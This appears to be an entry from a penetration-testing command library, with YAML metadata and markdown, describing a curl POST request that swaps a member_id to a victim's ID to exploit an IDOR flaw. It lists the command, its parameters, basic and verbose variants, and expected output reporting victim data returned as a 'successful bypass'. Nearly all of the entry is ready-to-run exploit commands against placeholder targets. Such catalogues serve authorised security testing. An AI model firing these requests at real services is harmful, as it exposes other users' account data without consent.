---
data: >-
  curl -X POST 'https://target.com/█████████' -H 'Content-Type:
  application/json' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"member_id":
  "VICTIM_ID"}'
tags:
  - web
  - post
  - exploit
type: command
output: |-
  HTTP/1.1 200 OK
  {"user_data": {"id": "VICTIM_ID", ...}}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-05T12:00:00Z'
updated_at: '2025-12-14T17:33:24.282Z'
id: 209705f6-9bbe-409a-9bc9-efa3b9746d80
verified: false
validated: true
submitted: true
---
# curl-manipulate-member-id

## Command

```bash
curl -X POST 'https://target.com/█████████' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{"member_id": "VICTIM_ID"}'
```

## Description

This command manipulates the member_id in a POST request to test IDOR by targeting a different user's account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `'https://target.com/█████████'` | Target endpoint URL | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON body type | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header | Yes |
| `-d '{"member_id": "VICTIM_ID"}'` | Body with tampered ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/█████████' -H 'Content-Type: application/json' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"member_id": "456"}'
```

### Advanced Usage

```bash
curl -v -X POST 'https://target.com/█████████' -H 'Content-Type: application/json' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"member_id": "456", "action": "view"}'
```

## Expected Output

200 OK with victim data, indicating successful bypass.

## Related

- [[Related Procedure|procedures/Manipulate-Member-ID-Parameter-in-Request]]
